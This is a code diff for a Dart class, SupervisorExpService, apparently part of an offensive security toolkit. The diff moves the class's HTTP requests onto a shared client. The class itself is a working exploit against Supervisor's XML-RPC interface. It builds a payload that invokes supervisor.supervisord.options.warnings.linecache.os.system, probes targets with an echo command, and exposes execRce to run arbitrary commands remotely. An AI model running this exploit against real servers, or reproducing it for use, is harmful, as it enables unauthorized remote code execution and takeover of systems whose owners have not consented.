@@ -1,6 +1,5 @@
-import 'package:http/http.dart' as http;
-
 import 'exp_result.dart';
+import '../../../core/http/http_client.dart';
 
 class SupervisorExpService {
   final String baseUrl;
@@ -14,6 +13,12 @@ class SupervisorExpService {
   String get _base =>
       baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;
 
+  late final MatrixHttpClient _httpClient = MatrixHttpClient(
+    baseUrl: baseUrl,
+    timeout: timeout,
+    allowBadCertificate: false,
+  );
+
   String _xmlPayload(String cmd) => '''<?xml version="1.0"?>
 <methodCall>
 <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
@@ -24,13 +29,11 @@ class SupervisorExpService {
 
   Future<ExpResult> check() async {
     try {
-      final res = await http
-          .post(
-            Uri.parse('$_base/RPC2'),
-            headers: {'Content-Type': 'text/xml'},
-            body: _xmlPayload('echo supervisord_54289'),
-          )
-          .timeout(timeout);
+      final res = await _httpClient.post(
+        '$_base/RPC2',
+        headers: {'Content-Type': 'text/xml'},
+        body: _xmlPayload('echo supervisord_54289'),
+      );
       if (res.statusCode == 200 || res.statusCode == 500) {
         return ExpResult(
           true,
@@ -44,14 +47,13 @@ class SupervisorExpService {
 
   Future<String?> execRce(String cmd) async {
     try {
-      final res = await http
-          .post(
-            Uri.parse('$_base/RPC2'),
-            headers: {'Content-Type': 'text/xml'},
-            body: _xmlPayload(cmd),
-          )
-          .timeout(timeout);
-      return res.body.isNotEmpty ? res.body : null;
+      final res = await _httpClient.post(
+        '$_base/RPC2',
+        headers: {'Content-Type': 'text/xml'},
+        body: _xmlPayload(cmd),
+      );
+      final body = res.body ?? '';
+      return body.isNotEmpty ? body : null;
     } catch (_) {
       return null;
     }
